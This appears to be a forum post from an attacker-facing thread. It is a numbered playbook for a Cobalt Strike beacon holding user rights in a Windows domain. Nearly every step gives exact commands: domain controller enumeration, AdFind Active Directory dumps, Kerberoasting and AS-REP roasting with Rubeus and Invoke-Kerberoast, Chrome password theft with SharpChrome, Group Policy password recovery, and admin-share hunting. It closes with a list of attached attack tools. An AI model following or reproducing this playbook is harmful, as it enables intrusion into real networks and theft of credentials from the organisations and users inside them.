In the input we have an ordinary bot with user rights and consider the first stage of work from this context.

1. Gathering information about domain controllers on the network
   - net domain_controllers
   - net dclist
   - shell nltest /dclist:
The first of the three commands is usually enough, but if it gives no result, you can try the others.

2. Gathering information about Active Directory composition using AdFind.exe
   - Load adfind.exe and adf.bat into a writable folder
   - move cobalt bin to the folder
   - run shell adf.bat
   - wait for script to finish
   - download the result and delete what you downloaded to your machine

3. Performing a kerberoast attack
   - execute-assembly /home/omar/Desktop/Fast-Guide/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
   - execute-assembly /home/omar/Desktop/Fast-Guide/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
   - download these files (if they give us results)
   - If they didn't give us results then we will use alternative powershell script to perform the attack
   - powershell-import /home/omar/Desktop/Fast-Guide/Invoke-Kerberoast.ps1
   - psinject 4728 x86 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath c:\ProgramData\pshashes.txt -append -force -encoding UTF8
      4728 in this case is the current pid and x86 is its bit size
   (obtained hashes will be sent to brute force to get cleartext passwords or will be used in the context of SYSTEM rights)

4. Collect information from the Chrome browser to search for possible local cleatextential credentials
   - Execute-assembly /home/omar/Desktop/Fast-Guide/SharpChrome.exe logins /showall
   (here we get the password set of the current user and some idea of what network and external resources this user uses)

5. Request information about domain administrators and local administrators
   - shell net group "domain admins" /dom
   - shell net localgroup administrators

6. Collecting information on the current machine using SeatBelt
   - execute-assembly /home/omar/Desktop/Fast-Guide/Seatbelt.exe -group=all -outputfile="C:\ProgramData\seatinfo.txt"
   (no explanations here, the number of checks there is decent and all information gathered is to some extent important both on the local machine and on the network)
   
7. Checking for saved passwords in domain group policy files
   - execute-assembly /home/omar/Desktop/Fast-Guide/Net-GPPassword.exe
   
8. Collect the available shares and see if any $ADMIN shares are available for our current user in the domain
   - powershell-import /home/omar/Desktop/Fast-Guide/ShareFinder.ps1
   - psinject 4728 x86 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
   (at this moment the scan is started and the result is written into a file, the file will be full size when the scan is finished and you can download it)

All utility output files are placed in a folder with the name of the case, the output of the beacon is written in a separate file creds.txt, which will lie in this folder.
* adf.bat (0.34 KB - downloaded 2 times).
* ShareFinder.ps1 (44.41 KB - downloaded 1 time).
* AdFind.exe (1361.5 KB - downloaded 3 times).
* Invoke-Kerberoast.ps1 (45.75 KB - downloaded 2 times).

I recommend to use all c# utilities attached in this thread, building them from sources on githab.
* Net-GPPPassword.exe (9 KB - downloaded 1 time).
* Rubeus.exe (223 KB - downloaded 4 times).
* Seatbelt.exe (534 KB - downloaded 1 time)
